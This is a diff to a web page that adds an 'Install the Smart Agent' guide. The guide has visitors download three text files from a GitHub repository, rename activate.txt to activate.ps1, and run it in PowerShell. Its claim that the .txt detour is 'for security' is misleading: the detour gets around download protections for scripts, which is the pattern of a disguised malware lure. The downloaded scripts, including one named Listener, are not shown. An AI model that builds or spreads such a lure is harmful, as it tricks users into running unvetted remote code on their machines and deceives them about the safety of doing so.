@@ -351,5 +351,55 @@ async function copyToClipboard(text, label = 'Copied') {
       });
     })();
   </script>
+<div class="agent-download-guide" style="background:#f9f9fb;border:1px solid #dadbe0;border-radius:8px;padding:1.5em;margin:2em 0;">
+  <h3 style="margin-top:0;">Install the Smart Agent</h3>
+  <ol style="font-size:1.07em;">
+    <li>
+      Download the following three files as <span style="color:#355;">.txt</span> using the buttons below.<br>
+      <span style="font-size:0.92em;color:#888;">
+        (Files are provided as .txt to work with all browsers and security settings.)
+      </span>
+    </li>
+    <li>
+      <strong>After downloading:</strong> <br>
+      <b>Rename</b> <span style="color:#333;">activate.txt</span> to <span style="color:#116;">activate.ps1</span> on your computer.<br>
+      <span style="font-size:0.93em;color:#999;">
+        (Right-click the file, select <b>Rename</b>, and change <b>activate.txt</b> to <b>activate.ps1</b>.)
+      </span>
+    </li>
+    <li>
+      <strong>Run</strong> <span style="color:#116;">activate.ps1</span> with PowerShell:<br>
+      <span style="color:#444;">Right-click the file and select <b>“Run with PowerShell”</b>.</span>
+    </li>
+    <li>
+      That’s it! The installer will finish setup and automatically run your agent.
+    </li>
+  </ol>
+  <div class="agent-download-buttons" style="margin-top:2em;">
+    <button onclick="downloadScript('https://github.com/JHRAd317/CMRWEBMD/raw/main/userfiles/Structure.txt','Structure.txt')">Download 1 — Structure.txt</button>
+    <button onclick="downloadScript('https://github.com/JHRAd317/CMRWEBMD/raw/main/userfiles/Listener.txt','Listener.txt')">Download 2 — Listener.txt</button>
+    <button onclick="downloadScript('https://github.com/JHRAd317/CMRWEBMD/raw/main/userfiles/activate.txt','activate.txt')">Download 3 — activate.txt</button>
+  </div>
+  <p style="color:#a66;font-size:0.96em;margin-top:1.25em;">
+    <b>Why .txt?</b> For security, browsers don’t allow direct downloading of .ps1 files. By downloading as .txt and renaming locally, you get a safe, working install every time.
+  </p>
+</div>
+<script>
+async function downloadScript(source, targetName) {
+    try {
+        const response = await fetch(source);
+        if (!response.ok) { alert("File not found: " + source); return; }
+        const text = await response.text();
+        const blob = new Blob([text], { type: "text/plain" });
+        const link = document.createElement("a");
+        link.href = URL.createObjectURL(blob);
+        link.download = targetName;
+        link.click();
+        setTimeout(() => URL.revokeObjectURL(link.href), 1500);
+    } catch(e) {
+        alert("Download failed: " + e);
+    }
+}
+</script>
 </body>
 </html>
